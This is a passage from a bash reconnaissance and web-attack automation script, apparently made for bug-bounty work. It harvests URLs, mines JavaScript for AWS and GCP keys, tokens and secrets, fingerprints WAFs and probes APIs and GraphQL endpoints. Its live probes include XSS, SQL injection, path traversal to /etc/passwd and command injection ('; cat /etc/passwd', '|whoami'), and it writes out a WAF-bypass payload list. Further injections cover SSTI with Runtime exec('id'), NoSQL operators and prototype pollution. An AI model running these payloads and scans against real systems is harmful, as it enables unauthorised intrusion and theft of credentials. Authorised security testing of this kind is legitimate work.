        || timeout 180 python3 -m waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" 2>/dev/null \
        || true
    log_ok "waymore: $(cnt "$O/waymore.txt") URLs"

    # urlscan.io URLs
    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
        | jq -r '.results[]?.page?.url' 2>/dev/null | sort -u > "$O/urlscan.txt" || true
    log_ok "urlscan.io: $(cnt "$O/urlscan.txt") URLs"

    # katana — standard crawl
    log_info "katana standard crawl..."
    timeout 120 katana -u "https://$DOMAIN" -jc -kf all \
        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        -silent -o "$O/katana_single.txt" 2>/dev/null || true

    # katana — list crawl
    log_info "katana list crawl (all live hosts)..."
    timeout 600 katana -list "$LIVE" -jc -kf all \
        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" -p 20 \
        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
        -silent -o "$O/katana_list.txt" 2>/dev/null || log_warn "katana list timed out"

    # katana — headless
    log_info "katana headless (JS-heavy)..."
    timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all \
        -d 2 -timeout 15 -c 20 \
        -silent -o "$O/katana_headless.txt" 2>/dev/null || true

    cat "$O/katana_single.txt" "$O/katana_list.txt" "$O/katana_headless.txt" \
        2>/dev/null | sort -u > "$O/katana.txt"
    log_ok "katana total: $(cnt "$O/katana.txt") URLs"

    # hakrawler
    log_info "hakrawler (300s cap)..."
    timeout 300 bash -c \
        "cat '$LIVE' | hakrawler -depth 2 -subs -u 2>/dev/null | sort -u > '$O/hakrawler.txt'" \
        || log_warn "hakrawler timed out"

    # Merge & dedup
    cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_urls_raw.txt"
    log_ok "Raw total: $(cnt "$O/all_urls_raw.txt") URLs"

    if has uro; then
        uro < "$O/all_urls_raw.txt" 2>/dev/null > "$O/all_urls.txt" || cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    else
        cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
    fi
    log_ok "Deduplicated: $(cnt "$O/all_urls.txt") URLs"

    # GF patterns
    log_info "GF pattern extraction..."
    local GF_PATTERNS=(xss sqli ssrf redirect lfi rce idor interestingparams interestingEXT)
    for p in "${GF_PATTERNS[@]}"; do
        gf "$p" "$O/all_urls.txt" 2>/dev/null | sort -u > "$O/gf/${p}.txt" || true
        local c; c=$(cnt "$O/gf/${p}.txt")
        [[ $c -gt 0 ]] && log_ok "gf[$p]: $c URLs"
    done

    # URLs with params
    grep -E '\?[a-zA-Z0-9_]+=.' "$O/all_urls.txt" | sort -u > "$O/urls_with_params.txt"
    log_ok "URLs with params: $(cnt "$O/urls_with_params.txt")"

    # ── Parameter-focused URL filtering (drop pure crawler noise) ──────────
    log_info "Filtering URLs to parameter/input/dynamic targets only..."

    # 1. URLs with any query parameter
    grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all_urls.txt" | sort -u         > "$O/urls_with_params.txt"

    # 2. URLs with user-input patterns (id, user, name, search, q, etc.)
    grep -iE '[?&](id|uid|user|username|email|name|q|query|search|s|key|token|ref|redirect|url|path|file|page|lang|cat|category|type|action|cmd|exec|input|data|val|value|param|p|t|n|m|v|c|i)=[^\&]+'         "$O/all_urls.txt" | sort -u > "$O/urls_user_input.txt"

    # 3. URLs with dynamic rendering signals (json, api, ajax, render, view, fetch)
    grep -iE '(/api/|/ajax/|/json|/render|/view|/fetch|/graphql|/rpc|/query|format=json|format=xml|callback=|jsonp=|\.json\?|\.xml\?)'         "$O/all_urls.txt" | sort -u > "$O/urls_dynamic.txt"

    # 4. All unique parameter names
    grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"         | sed 's/^[?&]//;s/=//' | sort -u > "$WORKSPACE/params/all_params.txt"

    # 5. Parameter type buckets (short grouped view)
    {
        echo "=== ID / Object Reference ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"             | grep -iE '(id|uid|oid|rid|cid|pid|sid|uuid|guid|ref|token|key|code|hash)='             | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Search / Query ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"             | grep -iE '(q|query|s|search|term|keyword|find|filter|sort|order)='             | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== User / Auth ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"             | grep -iE '(user|username|email|login|auth|session|pass|account|member|role|admin)='             | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Navigation / Path ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"             | grep -iE '(url|redirect|return|next|goto|path|file|dir|page|lang|locale|cat|category|section|tab|view|action|type|format|mode)='             | sed 's/^[?&]//;s/=//' | sort -u
        echo ""
        echo "=== Injection Candidates ==="
        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt"             | grep -iE '(cmd|exec|command|input|data|val|value|param|debug|test|payload|template|tpl|include|load|import|src|source)='             | sed 's/^[?&]//;s/=//' | sort -u
    } > "$WORKSPACE/params/params_by_type.txt"

    log_ok "URLs with params    : $(cnt "$O/urls_with_params.txt")"
    log_ok "URLs with user input: $(cnt "$O/urls_user_input.txt")"
    log_ok "URLs dynamic/API    : $(cnt "$O/urls_dynamic.txt")"
    log_ok "Unique param names  : $(cnt "$WORKSPACE/params/all_params.txt")"
    log_ok "Param type buckets  : $WORKSPACE/params/params_by_type.txt"
}

# ══════════════════════════════════════════════════════
# MODULE 04 — JS ANALYSIS
# ══════════════════════════════════════════════════════
mod_js() {
    progress "MODULE 04 — JavaScript Analysis"
    log_section "MODULE 04 — JAVASCRIPT ANALYSIS"
    local O="$WORKSPACE/js"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # Collect JS URLs
    grep -E '\.js(\?|$)' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u > "$O/js_urls.txt" || true

    # getJS per live host
    if has getJS; then
        while IFS= read -r url; do
            getJS --url "$url" --complete 2>/dev/null | grep -E '\.js(\?|$)' || true
        done < "$LIVE" | sort -u >> "$O/js_urls.txt" || true
        sort -u -o "$O/js_urls.txt" "$O/js_urls.txt" 2>/dev/null || true
    fi
    log_ok "JS files found: $(cnt "$O/js_urls.txt")"

    # Download JS using standalone helper (avoids heredoc quoting issues)
    log_info "Downloading JS files (parallel, target only)..."
    mkdir -p "$O/downloaded" || true
    grep -iE "${DOMAIN}" "$O/js_urls.txt" 2>/dev/null | head -200 > /tmp/js_target_$$.txt || true
    log_info "Filtered: $(wc -l < /tmp/js_target_$$.txt 2>/dev/null || echo 0) target JS files (skipping CDN)"
    python3 /usr/local/bin/bug_js_dl.py "$O/downloaded" "/tmp/js_target_$$.txt" 2>/dev/null || true
    rm -f "/tmp/js_target_$$.txt"
    log_ok "Downloaded: $(ls "$O/downloaded/"*.js 2>/dev/null | wc -l) files"

    # LinkFinder — run on downloaded files only (fast, no HTTP)
    if [[ -f "$HOME/tools/LinkFinder/linkfinder.py" ]]; then
        log_info "LinkFinder endpoint extraction (downloaded files only)..."
        find "$O/downloaded" -name "*.js" 2>/dev/null | head -200 | while IFS= read -r jsfile; do
            python3 "$HOME/tools/LinkFinder/linkfinder.py" -i "$jsfile" -o cli 2>/dev/null || true
        done | sort -u > "$O/linkfinder_endpoints.txt"
        log_ok "LinkFinder endpoints: $(cnt "$O/linkfinder_endpoints.txt")"
    else
        touch "$O/linkfinder_endpoints.txt"
    fi

    # SecretFinder — run on downloaded files only (fast, no HTTP)
    if [[ -f "$HOME/tools/SecretFinder/SecretFinder.py" ]]; then
        log_info "SecretFinder (downloaded files only)..."
        find "$O/downloaded" -name "*.js" 2>/dev/null | head -200 | while IFS= read -r jsfile; do
            python3 "$HOME/tools/SecretFinder/SecretFinder.py" -i "$jsfile" -o cli 2>/dev/null || true
        done > "$O/secrets_found.txt" 2>/dev/null || true
        [[ -s "$O/secrets_found.txt" ]] && log_hit "SECRETS IN JS: $(cnt "$O/secrets_found.txt") lines"
    else
        touch "$O/secrets_found.txt"
    fi

    # Deep regex on downloaded files
    log_info "Deep regex mining on downloaded JS..."
    local JS_ALL=""
    if ls "$O/downloaded/"*.js &>/dev/null 2>&1; then
        JS_ALL=$(cat "$O/downloaded/"*.js 2>/dev/null || true)
    fi

    if [[ -n "$JS_ALL" ]]; then
        echo "$JS_ALL" | grep -oE '(https?://|/)[a-zA-Z0-9._/?=&%-]+' \
            | grep -vE '\.(png|jpg|gif|css|woff|svg|ico|mp4|mp3)' \
            | sort -u > "$O/js_endpoints_raw.txt"

        echo "$JS_ALL" | grep -oE 'AKIA[A-Z0-9]{16}' | sort -u > "$O/aws_keys.txt"
        [[ -s "$O/aws_keys.txt" ]] && log_hit "AWS KEY CANDIDATES: $(cnt "$O/aws_keys.txt")"

        echo "$JS_ALL" | grep -oE 'AIza[0-9A-Za-z_-]{35}' | sort -u > "$O/gcp_keys.txt"
        [[ -s "$O/gcp_keys.txt" ]] && log_hit "GCP API KEY CANDIDATES: $(cnt "$O/gcp_keys.txt")"

        echo "$JS_ALL" | grep -oiE \
            '(api_?key|apikey|secret|password|passwd|token|auth_?token|access_?token|private_?key|bearer|client_?secret)["\s]*[:=]["\s]*["\x27][a-zA-Z0-9._/+\-]{8,}["\x27]' \
            | sort -u > "$O/potential_secrets.txt"
        log_ok "Potential secret patterns: $(cnt "$O/potential_secrets.txt")"

        echo "$JS_ALL" | grep -oE 'eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*' \
            | sort -u > "$O/jwt_tokens.txt"
        [[ -s "$O/jwt_tokens.txt" ]] && log_warn "JWTs in JS: $(cnt "$O/jwt_tokens.txt")"

        echo "$JS_ALL" | grep -oE \
            '(innerHTML|outerHTML|document\.write|\.html\(|eval\(|setTimeout\(|setInterval\(|location\.href|location\.hash|document\.cookie|window\.location)[^;,\n]{0,100}' \
            | sort -u > "$O/dom_xss_sinks.txt"
        log_ok "DOM XSS sinks: $(cnt "$O/dom_xss_sinks.txt")"

        echo "$JS_ALL" | grep -oiE 'postMessage|addEventListener.*message' \
            | sort -u > "$O/postmessage_usage.txt"
        [[ -s "$O/postmessage_usage.txt" ]] && log_warn "postMessage usage found — XSS vector possible"

        echo "$JS_ALL" | grep -oE '[a-zA-Z0-9_-]+\.s3[\.-][a-zA-Z0-9.-]*\.amazonaws\.com' \
            | sort -u > "$O/s3_in_js.txt"
        [[ -s "$O/s3_in_js.txt" ]] && log_warn "S3 bucket refs in JS: $(cnt "$O/s3_in_js.txt")"

        echo "$JS_ALL" | grep -oiE \
            '(baseURL|apiURL|api_url|API_URL|baseUrl|apiBase)["\s]*[:=]["\s]*["'"'"'][^"'"'"']{5,100}["'"'"']' \
            | sort -u > "$O/api_base_urls.txt"
        log_ok "API base URLs: $(cnt "$O/api_base_urls.txt")"
    else
        log_warn "No downloaded JS content to mine — creating empty output files"
        for f in js_endpoints_raw aws_keys gcp_keys potential_secrets jwt_tokens \
                  dom_xss_sinks postmessage_usage s3_in_js api_base_urls; do
            touch "$O/${f}.txt"
        done
    fi

    # Merge all JS endpoints
    cat "$O/linkfinder_endpoints.txt" "$O/js_endpoints_raw.txt" 2>/dev/null \
        | sort -u > "$O/all_js_endpoints.txt"
    log_ok "Total JS endpoints: $(cnt "$O/all_js_endpoints.txt")"

    # Feed master endpoint list
    cat "$O/all_js_endpoints.txt" >> "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || true
    sort -u -o "$WORKSPACE/endpoints/all_endpoints.txt" "$WORKSPACE/endpoints/all_endpoints.txt" 2>/dev/null || true
}


# ══════════════════════════════════════════════════════
# MODULE WAF — WAF FINGERPRINTING & BYPASS PROFILING
# ══════════════════════════════════════════════════════
mod_waf() {
    progress "MODULE WAF — WAF Fingerprinting & Bypass Profiling"
    log_section "MODULE WAF — WAF FINGERPRINTING"
    local O="$WORKSPACE/waf"
    mkdir -p "$O"
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # ── wafw00f detection ─────────────────────────────
    if has wafw00f; then
        log_info "wafw00f passive+active detection..."
        while IFS= read -r url; do
            wafw00f "$url" -a -o "$O/wafw00f_$(safe_name "$url").json" --format=json 2>/dev/null || true
        done < <(head -10 "$LIVE" 2>/dev/null)
        # Aggregate
        find "$O" -name "wafw00f_*.json" -exec jq -r '.detected[]? | "\(.waf) | \(.url)"' {} 2>/dev/null \;             | sort -u > "$O/waf_detected.txt" || true
        if [[ -s "$O/waf_detected.txt" ]]; then
            log_warn "WAFs detected:"
            cat "$O/waf_detected.txt" | while IFS= read -r line; do log_warn "  $line"; done
        else
            log_ok "No WAF detected by wafw00f (or unrecognised)"
        fi
    else
        log_warn "wafw00f not found — installing..."
        pip3 install -q wafw00f --break-system-packages 2>/dev/null && has wafw00f             && { log_ok "wafw00f installed"; mod_waf; return; }             || log_warn "wafw00f install failed — skipping passive detection"
    fi

    # ── Header mutation probes ────────────────────────
    log_info "Header mutation fingerprinting..."
    local MAIN; MAIN=$(head -1 "$LIVE" 2>/dev/null)
    [[ -z "$MAIN" ]] && MAIN="https://$DOMAIN"

    declare -A WAF_SIGS=(
        ["Cloudflare"]="cf-ray|cloudflare"
        ["Akamai"]="akamai|x-akamai"
        ["AWS WAF"]="x-amzn-requestid|x-amz-cf-id"
        ["Imperva/Incapsula"]="x-iinfo|incap_ses|visid_incap"
        ["F5 BIG-IP"]="x-wa-info|ts=[0-9a-f]"
        ["Sucuri"]="x-sucuri-id|sucuri"
        ["Fastly"]="x-fastly|fastly"
        ["ModSecurity"]="mod_security|modsec"
    )

    local hdrs; hdrs=$(_curl -I "$MAIN" 2>/dev/null | tr '[:upper:]' '[:lower:]')
    for waf in "${!WAF_SIGS[@]}"; do
        local sig="${WAF_SIGS[$waf]}"
        if echo "$hdrs" | grep -qiE "$sig"; then
            echo "HEADER_MATCH: $waf" >> "$O/waf_header_match.txt"
            log_warn "WAF header match: $waf"
        fi
    done

    # ── Payload probe — how does it block? ───────────
    log_info "WAF behavior probes (block/pass/transform)..."
    local -a PROBES=(
        "/?__test__=<script>alert(1)</script>"
        "/?__test__=' OR 1=1--"
        "/?__test__=../../../etc/passwd"
        "/?__test__=; cat /etc/passwd"
        "/?__test__={{7*7}}"
        "/?__test__=|whoami"
    )
    local -a LABELS=("XSS" "SQLi" "LFI" "CMDi" "SSTI" "CMDi2")
    for i in "${!PROBES[@]}"; do
        local probe="${PROBES[$i]}"
        local label="${LABELS[$i]}"
        local resp_code; resp_code=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${probe}" 2>/dev/null || echo "000")
        local resp_body; resp_body=$(_curl -s "${MAIN}${probe}" 2>/dev/null | head -c 2000 || true)
        local result="PASS[$resp_code]"
        echo "$resp_body" | grep -qiE "(blocked|forbidden|access denied|request denied|detected|firewall|illegal|malicious|attack)"             && result="BLOCKED[$resp_code]"
        [[ "$resp_code" == "403" || "$resp_code" == "406" || "$resp_code" == "429" || "$resp_code" == "503" ]]             && result="BLOCKED[$resp_code]"
        echo "[$label] $result  ${MAIN}${probe}" >> "$O/waf_probe_results.txt"
    done
    log_ok "WAF probe results → $O/waf_probe_results.txt"

    # ── Bypass mutations if WAF detected ─────────────
    if [[ -s "$O/waf_detected.txt" || -s "$O/waf_header_match.txt" ]]; then
        log_info "Generating WAF bypass mutation set..."
        cat > "$O/waf_bypass_payloads.txt" << 'WAFBYPASS'
# XSS bypasses
<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
%3Cscript%3Ealert(1)%3C/script%3E
<script>alert(1)</script>
<a href="javas&#99;ript:alert(1)">
# SQLi bypasses
'/**/OR/**/1=1--
'%09OR%091=1--
' /*!OR*/ 1=1--
'||'1'='1
1'||'1'='1'||'1'='1
' OR 1=1 LIMIT 1 OFFSET 1--
# LFI bypasses
....//....//etc/passwd
..%252f..%252fetc/passwd
%2e%2e%2fetc%2fpasswd
php://filter/read=convert.base64-encode/resource=index.php
# SSTI bypasses
{{7*'7'}}
'${7*7}'
<%= 7*7 %>
#{7*7}
*{7*7}
WAFBYPASS
        log_ok "WAF bypass payloads written → $O/waf_bypass_payloads.txt"
    fi

    # ── Rate-limit threshold probe ────────────────────
    log_info "Rate-limit threshold probe (20 rapid requests)..."
    local block_count=0
    for i in $(seq 1 20); do
        local c; c=$(_curl -o /dev/null -w "%{http_code}" "$MAIN" 2>/dev/null || echo "000")
        [[ "$c" == "429" || "$c" == "503" ]] && ((block_count++))
    done
    echo "rate_limit_blocks_in_20_req=$block_count" >> "$O/waf_probe_results.txt"
    [[ $block_count -gt 0 ]] && log_warn "Rate limiting detected: $block_count/20 requests blocked"         || log_ok "No rate limiting on 20 rapid requests"

    log_ok "WAF fingerprinting complete → $O/"
}


# ══════════════════════════════════════════════════════
# MODULE API — API SCHEMA DISCOVERY
# ══════════════════════════════════════════════════════
mod_api_schema() {
    progress "MODULE API — API Schema Discovery"
    log_section "MODULE API — API SCHEMA DISCOVERY (OpenAPI/GraphQL)"
    local O="$WORKSPACE/api_schema"
    mkdir -p "$O"/{openapi,graphql,undocumented}
    local LIVE="$WORKSPACE/subdomains/live_urls.txt"

    # ── OpenAPI / Swagger discovery ───────────────────
    log_info "OpenAPI/Swagger spec hunting..."
    local -a API_PATHS=(
        "/swagger.json" "/swagger.yaml" "/swagger/v1/swagger.json"
        "/swagger-ui.html" "/swagger-ui/" "/swagger-ui/index.html"
        "/api-docs" "/api-docs.json" "/api/swagger.json"
        "/api/v1/swagger.json" "/api/v2/swagger.json" "/api/v3/swagger.json"
        "/openapi.json" "/openapi.yaml" "/openapi/v1" "/openapi/v2"
        "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
        "/api/openapi.json" "/api/openapi.yaml"
        "/redoc" "/redoc.html" "/.well-known/openapi"
        "/api/schema/" "/schema/swagger.json"
        "/api/swagger-ui.html"
    )

    while IFS= read -r base; do
        for path in "${API_PATHS[@]}"; do
            local url="${base}${path}"
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo "000")
            if [[ "$code" == "200" ]]; then
                local body; body=$(_curl "$url" 2>/dev/null || true)
                # Confirm it looks like a real spec
                if echo "$body" | grep -qiE "(swagger|openapi|"paths"|"info"|"endpoints")"; then
                    echo "$url" >> "$O/openapi/specs_found.txt"
                    local fname="$O/openapi/$(safe_name "$url").json"
                    echo "$body" > "$fname"
                    log_hit "API SPEC FOUND: $url"
                    # Extract endpoints from spec
                    echo "$body" | jq -r '.paths | keys[]?' 2>/dev/null                         >> "$O/openapi/spec_endpoints.txt" || true
                fi
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    touch "$O/openapi/spec_endpoints.txt" "$O/openapi/specs_found.txt" 2>/dev/null || true
    sort -u -o "$O/openapi/spec_endpoints.txt" "$O/openapi/spec_endpoints.txt" 2>/dev/null || true
    log_ok "OpenAPI specs: $(cnt "$O/openapi/specs_found.txt") | Endpoints in specs: $(cnt "$O/openapi/spec_endpoints.txt")"

    # ── GraphQL introspection ─────────────────────────
    log_info "GraphQL endpoint detection + introspection..."
    local -a GQL_PATHS=("/graphql" "/api/graphql" "/graphql/v1" "/v1/graphql"
                        "/graphiql" "/graphql-explorer" "/gql" "/query" "/api/query")

    while IFS= read -r base; do
        for path in "${GQL_PATHS[@]}"; do
            local url="${base}${path}"
            # Basic probe
            local resp; resp=$(_curl -X POST -H "Content-Type: application/json"                 -d '{"query":"{ __typename }"}' "$url" 2>/dev/null || true)
            if echo "$resp" | grep -qiE "("data":|"__typename"|"errors":)" && echo "$resp" | grep -q "{"; then
                echo "GQL_ENDPOINT: $url" >> "$O/graphql/endpoints.txt"
                log_hit "GraphQL endpoint: $url"

                # Full introspection
                local INTROSPECTION_Q='{"query":"{ __schema { queryType { name } types { name kind fields { name args { name type { name kind } } } } } }"}'
                local schema; schema=$(_curl -X POST -H "Content-Type: application/json"                     -d "$INTROSPECTION_Q" "$url" 2>/dev/null || true)
                if echo "$schema" | grep -qiE "__schema|queryType"; then
                    echo "$schema" > "$O/graphql/schema_$(safe_name "$url").json"
                    log_hit "GraphQL introspection enabled: $url"
                    echo "INTROSPECTION_OPEN: $url" >> "$O/graphql/introspection_open.txt"
                    # Extract type names
                    echo "$schema" | jq -r '.data.__schema.types[]?.name' 2>/dev/null                         | grep -v "^__" | sort -u >> "$O/graphql/type_names.txt" || true
                else
                    echo "INTROSPECTION_DISABLED: $url" >> "$O/graphql/introspection_disabled.txt"
                fi

                # Batch attack probe
                local batch_resp; batch_resp=$(_curl -X POST -H "Content-Type: application/json"                     -d '[{"query":"{ __typename }"},{"query":"{ __typename }"}]' "$url" 2>/dev/null || true)
                echo "$batch_resp" | grep -qiE "(data|__typename)"                     && echo "BATCH_ENABLED: $url" >> "$O/graphql/batch_enabled.txt"                     && log_warn "GraphQL batching enabled (DoS / rate-limit bypass): $url"

                # Depth limit probe
                local depth_q='{"query":"{ a: __typename b: __typename c: __typename d: __typename e: __typename f: __typename g: __typename h: __typename i: __typename j: __typename }"}'
                _curl -X POST -H "Content-Type: application/json" -d "$depth_q" "$url" 2>/dev/null                     | grep -qiE "(error|limit|exceeded)"                     || echo "NO_DEPTH_LIMIT: $url" >> "$O/graphql/no_depth_limit.txt" || true
            fi
        done
    done < <(head -15 "$LIVE" 2>/dev/null)
    sort -u "$O/graphql/endpoints.txt" 2>/dev/null | wc -l         | xargs -I{} log_ok "GraphQL endpoints found: {}" || true

    # ── Undocumented endpoint fuzzing ─────────────────
    log_info "API version + undocumented path fuzzing..."
    local MAIN="https://$DOMAIN"
    local -a API_VERSIONS=("v1" "v2" "v3" "v4" "v5" "v1.0" "v2.0" "latest" "beta" "alpha" "dev" "internal" "private")
    local -a API_BASES=("/api" "/api/rest" "/rest" "/service" "/services" "/backend")
    local -a API_RESOURCES=("users" "user" "accounts" "account" "orders" "order" "products" "product"
                             "admin" "config" "settings" "payments" "invoices" "customers" "members"
                             "reports" "export" "import" "upload" "auth" "tokens" "keys" "webhooks"
                             "roles" "permissions" "groups" "events" "logs" "audit" "metrics")

    for base in "${API_BASES[@]}"; do
        for ver in "${API_VERSIONS[@]}"; do
            local c; c=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}" 2>/dev/null || echo "000")
            if [[ "$c" =~ ^(200|201|401|403)$ ]]; then
                echo "API_BASE_FOUND [${c}]: ${MAIN}${base}/${ver}" >> "$O/undocumented/api_bases.txt"
                # If accessible, probe resources
                for res in "${API_RESOURCES[@]}"; do
                    local rc; rc=$(_curl -o /dev/null -w "%{http_code}" "${MAIN}${base}/${ver}/${res}" 2>/dev/null || echo "000")
                    [[ "$rc" =~ ^(200|201|401|403)$ ]] &&                         echo "API_RESOURCE [${rc}]: ${MAIN}${base}/${ver}/${res}" >> "$O/undocumented/api_resources.txt"
                done
            fi
        done
    done
    log_ok "Undocumented API bases: $(cnt "$O/undocumented/api_bases.txt")"
    log_ok "Undocumented API resources: $(cnt "$O/undocumented/api_resources.txt")"

    # ── Feed interesting paths ────────────────────────
    cat "$O/openapi/spec_endpoints.txt" "$O/graphql/endpoints.txt"         "$O/undocumented/api_resources.txt" 2>/dev/null         >> "$WORKSPACE/endpoints/interesting_paths.txt" || true
    sort -u -o "$WORKSPACE/endpoints/interesting_paths.txt"         "$WORKSPACE/endpoints/interesting_paths.txt" 2>/dev/null || true

    log_ok "API schema discovery complete → $O/"
}


# ══════════════════════════════════════════════════════
# MODULE PMF — PARAMETER MUTATION FUZZING
# ══════════════════════════════════════════════════════
mod_param_fuzz() {
    [[ "$F_NO_EXPLOIT" == true ]] && return
    progress "MODULE PMF — Parameter Mutation Fuzzing"
    log_section "MODULE PMF — PARAMETER MUTATION FUZZING (SSTI/Type Confusion/Hidden Params)"
    local O="$WORKSPACE/vulns/param_fuzz"
    mkdir -p "$O"/{ssti,type_confusion,hidden_params,json_xml}
    touch "$O/ssti/ssti_confirmed.txt" "$O/ssti/ssti_error.txt" "$O/type_confusion/findings.txt" "$O/json_xml/json_hits.txt" "$O/json_xml/json_500.txt" "$O/hidden_params/discovered_params.txt" 2>/dev/null || true
    local PARAMS_IN="$WORKSPACE/urls/urls_with_params.txt"
    [[ ! -s "$PARAMS_IN" ]] && PARAMS_IN="$WORKSPACE/urls/urls_with_params.txt"

    # ── SSTI detection ────────────────────────────────
    log_info "SSTI detection (Jinja2/Twig/Freemarker/Pebble/Velocity/ERB)..."
    local -a SSTI_PAYLOADS=(
        "{{7*7}}" "{{7*'7'}}" '${7*7}' "<%= 7*7 %>" "#{7*7}" "*{7*7}"
        '{{config}}' '{{self}}' '{{<%SSTI%>}}'
        "{{'7'*7}}" "{{range.new(0,7)}}" "{{1+1}}"
        "{%print(7*7)%}" "{% debug %}" "{{dump(app)}}"
        '#{class.forName("java.lang.Runtime")}'
        "#{7*7}" "T(java.lang.Runtime).getRuntime().exec('id')"
    )
    local -a SSTI_EXPECTED=("49" "49" "49" "49" "49" "49")

    while IFS= read -r url; do
        for payload in "${SSTI_PAYLOADS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$payload" 2>/dev/null || true)
            local resp; resp=$(_curl "$furl" 2>/dev/null | head -c 3000 || true)
            if echo "$resp" | grep -qP "\b49\b|\b7777777\b"; then
                echo "SSTI_CONFIRMED: $furl (payload: $payload)" >> "$O/ssti/ssti_confirmed.txt"
                log_hit "SSTI CONFIRMED: $furl"
            elif echo "$resp" | grep -qiE "(template|render|jinja|twig|freemarker|velocity|smarty|mako).*error"; then
                echo "SSTI_ERROR_LEAK: $furl" >> "$O/ssti/ssti_error.txt"
            fi
        done
    done < <(head -150 "$PARAMS_IN" 2>/dev/null)
    log_ok "SSTI confirmed: $(cnt "$O/ssti/ssti_confirmed.txt")"

    # ── Type confusion probes ─────────────────────────
    log_info "Type confusion / mass assignment probes..."
    local -a TYPE_MUTATIONS=(
        "0" "-1" "999999999" "null" "undefined" "true" "false"
        "[]" "{}" "[""]" "[null]" "NaN" "Infinity" "-Infinity"
        "0.0" "1e308" "-1e308" "0x41" "0b1" "1.1.1"
        "%00" "%0a" "%0d" "\x00" "\n" "\r\n"
        "'OR 1=1--" "<script>" "{{7*7}}" "../etc/passwd"
    )

    while IFS= read -r url; do
        for mut in "${TYPE_MUTATIONS[@]}"; do
            local furl; furl=$(echo "$url" | qsreplace "$mut" 2>/dev/null || true)
            local code; code=$(_curl -o /dev/null -w "%{http_code}" "$furl" 2>/dev/null || echo "000")
            local body; body=$(_curl "$furl" 2>/dev/null | head -c 2000 || true)
            # Interesting: 500 errors, type errors, stack traces
            if [[ "$code" == "500" ]] || echo "$body" | grep -qiE "(stack trace|unhandled exception|typeerror|valueerror|null pointer|undefined method|cannot read property|parse error|invalid.*type|expected.*number|expected.*string)"; then
                echo "TYPE_CONFUSION [${code}] (${mut}): $furl" >> "$O/type_confusion/findings.txt"
            fi
        done
    done < <(head -80 "$PARAMS_IN" 2>/dev/null)
    log_ok "Type confusion findings: $(cnt "$O/type_confusion/findings.txt")"

    # ── Hidden parameter discovery (ParamMiner-style) ─
    log_info "Hidden parameter discovery (ParamMiner-style ffuf)..."
    local PARAM_WL="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
    [[ ! -f "$PARAM_WL" ]] && PARAM_WL="/usr/share/wordlists/dirb/common.txt"

    while IFS= read -r url; do
        local base_url="${url%%\?*}"
        local s; s=$(safe_name "$url")
        # GET param fuzzing
        _ffuf -u "${base_url}?FUZZ=bugbounty_test"             -w "$PARAM_WL"             -t 50             -mc 200,201,302             -fs 0             -of json -o "$O/hidden_params/ffuf_get_${s}.json"             -s 2>/dev/null || true
        # POST param fuzzing
        _ffuf -u "$base_url"             -X POST             -d "FUZZ=bugbounty_test"             -H "Content-Type: application/x-www-form-urlencoded"             -w "$PARAM_WL"             -t 50             -mc 200,201,302             -fs 0             -of json -o "$O/hidden_params/ffuf_post_${s}.json"             -s 2>/dev/null || true
    done < <(head -30 "$WORKSPACE/subdomains/status_200.txt" 2>/dev/null)

    # Aggregate hidden param hits
    find "$O/hidden_params" -name "*.json" -size +10c 2>/dev/null         | xargs -I{} jq -r '.results[]?.input.FUZZ' {} 2>/dev/null         | sort -u > "$O/hidden_params/discovered_params.txt" || true
    log_ok "Hidden params discovered: $(cnt "$O/hidden_params/discovered_params.txt")"

    # ── JSON / XML mutation ───────────────────────────
    log_info "JSON/XML body mutation on API endpoints..."
    local API_URLS="$WORKSPACE/urls/urls_dynamic.txt"
    [[ ! -s "$API_URLS" ]] && API_URLS="$WORKSPACE/urls/urls_with_params.txt"

    local -a JSON_PAYLOADS=(
        '{"__proto__":{"admin":true}}' 
        '{"constructor":{"prototype":{"admin":true}}}' 
        '{"$where":"sleep(1000)"}' 
        '{"$gt":"","$ne":""}' 
        '{"id":{"$gt":0}}' 
        '{"role":"admin","is_admin":true,"privilege":9999}' 
        '{"a":"b","c":"d","e":"f","g":"h","i":"j","k":"l","m":"n","o":"p","q":"r","s":"t","u":"v","w":"x","y":"z","aa":"bb","cc":"dd","ee":"ff","gg":"hh","ii":"jj","kk":"ll","mm":"nn"}' 
    )
    local -a JSON_LABELS=("prototype_pollution" "constructor_pollution" "nosqli_where" "nosqli_ne" "nosqli_gt" "mass_assign" "large_payload")

    while IFS= read -r url; do
        for i in "${!JSON_PAYLOADS[@]}"; do
            local payload="${JSON_PAYLOADS[$i]}"
